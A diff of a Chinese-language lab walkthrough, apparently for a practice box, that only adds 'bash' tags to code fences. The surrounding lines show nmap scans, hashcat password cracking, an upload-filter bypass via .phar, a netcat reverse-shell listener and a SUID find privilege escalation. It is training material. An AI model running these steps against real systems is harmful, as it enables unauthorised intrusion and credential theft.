@@ -14,7 +14,7 @@ tags:
 
 扫描所执行的命令，执行结果如下
 
-```
+```bash
 sudo nmap -sn 10.10.10.0/24
 
 sudo nmap --min-rate 10000 -p- 10.10.10.31   
@@ -41,7 +41,7 @@ sudo nmap --script=vuln -p22,80 10.10.10.31
 
 使用 hashcat 破解
 
-```
+```bash
 sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -51,7 +51,7 @@ sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
 
 使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger
 
-```
+```bash
 ftp 10.10.10.6
 ```
 
@@ -59,13 +59,13 @@ ftp 10.10.10.6
 
 binary 进入 二进制 模式
 
-```
+```bash
 binary
 ```
 
 获取文件
 
-```
+```bash
 ls -liah
 
 cd files
@@ -113,7 +113,7 @@ php 被过滤了，尝试不常见的 php 后缀，发现 phar 没被过滤
 
 kali 建立 监听
 
-```
+```bash
 sudo nc -lvnp 4444
 ```
 
@@ -126,7 +126,7 @@ sudo nc -lvnp 4444
 
 切换成 hostinger 用户
 
-```
+```bash
 su hostinger
 ```
 
@@ -138,7 +138,7 @@ su hostinger
 
 查看具有 s 位 的可执行文件
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
@@ -146,7 +146,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 使用 find 提权
 
-```
+```bash
 sudo install -m =xs $(which find) .
 
 ./find . -exec /bin/bash -p \; -quit
